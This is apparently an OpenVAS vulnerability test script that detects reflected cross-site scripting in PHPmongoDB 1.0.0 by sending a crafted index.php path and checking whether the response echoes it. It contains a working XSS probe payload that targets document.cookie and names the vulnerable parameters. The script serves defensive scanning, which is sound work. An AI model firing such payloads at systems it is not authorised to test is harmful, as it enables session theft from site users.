###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_phpmongodb_mult_vuln.nasl 12455 2018-11-21 09:17:27Z cfischer $
#
# PHPmongoDB CSRF And XSS Vulnerabilities
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:php:mongodb";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807554");
  script_version("$Revision: 12455 $");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-11-21 10:17:27 +0100 (Wed, 21 Nov 2018) $");
  script_tag(name:"creation_date", value:"2016-04-25 11:53:15 +0530 (Mon, 25 Apr 2016)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("PHPmongoDB CSRF And XSS Vulnerabilities");

  script_tag(name:"summary", value:"This host is installed with PHPmongoDB
  and is prone to multiple cross site scripting and cross site request forgery
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"Multiple flaws are due,

  - The multiple cross-site request forgery (CSRF) vulnerabilities in the
    index.php script which can be exploited via different vectors.

  - An insufficient validation of user-supplied input via GET parameters
    'URL', 'collection', 'db' and POST parameter 'collection' in index.php
    script and other parameters may be also affected.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to execute arbitrary script code in a user's browser session, and to
  conduct request forgery attacks.");

  script_tag(name:"affected", value:"PHPmongoDB version 1.0.0");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/136686");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_phpmongodb_remote_detect.nasl");
  script_mandatory_keys("PHPmongoDB/Installed");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!mongoPort = get_app_port(cpe:CPE)){
  exit(0);
}

if(!mongodir = get_app_location(cpe:CPE, port:mongoPort)){
  exit(0);
}

if(mongodir == "/"){
  mongodir = "";
}

mongourl = mongodir + '/index.php/"><script>alert(document.cookie)</script>';

if(http_vuln_check(port:mongoPort, url:mongourl, check_header:TRUE,
                   pattern:"<script>alert\(document.cookie\)</script>",
                   extra_check:make_list('content="mongoDB', 'PHPmongoDB.org',
                                         '>Sign In')))
{
  report = report_vuln_url( port:mongoPort, url:mongourl );
  security_message(port:mongoPort, data:report);
  exit(0);
}
